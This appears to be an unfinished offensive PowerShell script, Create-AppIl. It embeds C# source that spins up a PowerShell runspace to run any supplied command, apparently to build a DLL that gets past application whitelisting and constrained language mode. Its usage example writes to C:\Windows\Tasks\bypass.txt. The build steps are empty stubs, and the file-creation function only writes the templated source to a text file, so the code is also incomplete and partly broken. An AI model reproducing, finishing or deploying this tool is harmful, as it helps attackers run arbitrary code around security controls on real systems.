function Create-AppIl
{
<#
	.SYNOPSIS
		Generates a dll with an arbitary Entrypoint and powershell commands. 
		Author: p4yl0ad (p4yl0ad@protonmail.com)  
		License: BSD 3-Clause  
		Required Dependencies: System.Management.Automation.dll in current working directory

	.DESCRIPTION
		Utilizes System.Management.Automation.Runspaces in order to create a powershell runspace
		
	.PARAMETER DllName
		Specifies the Name for the dll, if ommited iso standard date will be used for the binary

	.PARAMETER Entry
		Specifies the Entry point for the dll

	.PARAMETER Command
		The command to be executed in the powershell runspace

	.PARAMETER Build
		Build the il to a dll with a patched entrypont

	.EXAMPLE
		Create-AppIl -DllName test1 -Entry test2 -Command test4 -Build
		Create-AppIl -DllName "ayylmao" -Entry "Poon" -Command "$ExecutionContext.SessionState.LanguageMode > C:\Windows\Tasks\bypass.txt" -Build	
#>
param
(
    [Parameter()]
    [string]$DllName,
	
    [Parameter(Mandatory)]
    [string]$Entry,
	
	[Parameter(Mandatory)]
    [String]$Command,

    [Parameter()]
    [switch]$Build
				
)


begin
{
    $global:DllName = $DllName
    $global:Entry = $Entry
    $global:Command = $Command
    $global:Build = $Build

    $global:src = @"
using System;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Management.Automation.Runspaces;

public class Program
{
	public static void Main()
	{
	}
	public class Code
	{
		public static void Exec()
		{	
			string command = "{PEPEGA}";
			RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
			Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
			rspace.Open();
			Pipeline pipeline = rspace.CreatePipeline();
			pipeline.Commands.AddScript(command);
			pipeline.Invoke();
		}
	}
}
"@
    $global:cscpath = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
    $global:ildasm = "C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\x64\ildasm.exe"
    $global:smadll = "C:\Program Files (x86)\Reference Assemblies\Microsoft\WindowsPowerShell\3.0\System.Management.Automation.dll"
}


Process{
    if (Test-Path $cscpath)
    {
    	Write-Host "csc.exe found"
    	if (Test-Path $ildasm)
    	{
		    Write-Host "ildasm.exe found"
		    if (Test-Path $smadll)
		    {	
    			Write-Host "System.Management.Automation.dll found"
			    Write-Host "Ready to proceed"
			    if ($DllName.Length -eq '0')
			    {
				    Write-Host "Did not supply name"
				    $global:DllName = Get-Date -f yyyy-MM-dd-ss
				    Invoke-FileCreate($DllName, $Command)
			    }
			    Invoke-FileCreate	
		    }
	    }
    }
}


end{
}


}


function Invoke-FileCreate {
    Write-Host $global:DllName
    Write-Host $global:Entry
    Write-Host $global:Command

	$fin = $src.Replace("{PEPEGA}",$Command)
	Write-Host $fin
    $DllName = $global:DllName + ".txt"
    $fin | Out-File $DllName
    break
}

function compile{
	
}

function toil{
	
}

function recompile{
	
}
